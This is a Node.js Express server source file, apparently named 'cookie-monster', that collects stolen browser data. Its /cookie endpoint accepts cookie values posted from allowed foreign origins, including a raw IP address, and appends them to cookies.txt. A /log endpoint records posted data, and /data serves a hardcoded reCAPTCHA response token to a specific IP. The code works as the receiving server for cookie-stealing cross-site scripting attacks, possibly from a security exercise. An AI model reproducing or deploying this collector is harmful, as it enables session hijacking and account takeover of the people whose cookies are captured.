'use strict';

//modules
var fs = require('fs');

// setup express
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cors = require('cors');
const port = process.env.PORT || 3000;

// packages for express
app.use( bodyParser.json() );       // to support JSON-encoded bodies
app.use(bodyParser.urlencoded({     // to support URL-encoded bodies
 extended: true})); 
 app.use(cors({
    origin: ['http://65.21.255.24/', 'https://cookie-monster-jfam.herokuapp.com/', 'http://cookie-monster-jfam.herokuapp.com/']
}));

var cookieFunc = function(cookie){
    fs.appendFile('cookies.txt', cookie, function (err){
        if(err) throw err;
        console.log("Saved cookie " + cookie + " to file.");
    });
}

app.get('/', (req, res)=>{
    res.sendFile('./index.html', { root : __dirname});
});

app.post('/cookie', (req, res)=>{
    cookieFunc(req.body.cookie);
    res.send('<h1>Posted!</h1>');
});

app.post('/log', (req, res)=>{
    console.log(req.body.log);
    res.sendStatus(200);
});

app.post('/checkbody',(req,res)=>{
	const resp = req.body['g-recaptcha-response']
	res.type('txt')
	if(!resp) return res.send('??');
    return res.send('ok');
});

app.get('/data',(req,res)=>{
    const params = {"g-recaptcha-response":"03AGdBq261ht3M5qK2OfbdcI0VReAF-TJrlLXbS19Ey3gt914UlgDEf1pCk2DJUfFKxOIW5bt5poSzmPG-Yt5rKs1UO0LWmZ-BYhauPsY-RlJmEmfMsXKku1H4R1n96nkE2Ii_MmsQy3azux8H7YfCVTmNE4ocUgtFGUG7InG4hRoT0MyTMx41eIE-fxdyIqqpeoJ0Q2sFTET1-GYUZ9UmWNDg9DaxpdesuPFRkmbOps0lRy5BeDH20zMBbUBbhGJxSjNHKF6jjsNEaOwUUyOljD7W26UXNFE72bmmhdaQot2_hQS7LcHahp_gf0EGkEKaexvJ2OaAqAo2xGgGxHkbTkBTXDIWxMaHSIBOT3R1I2CWu93xJDFw5gZVkccUa1uSKa2GULzxHBcMCfZVlrfKvnw67XGzwqiLr147YLzupV4LA1BZW4uu_I3d2T0Bp5ijh28dO1zEAQ5t"};
    res.set('Access-Control-Allow-Origin','http://65.21.255.24:5000');
    res.send(JSON.stringify(params));
});

app.listen(port, ()=>{
    console.log("Running on " + port);
})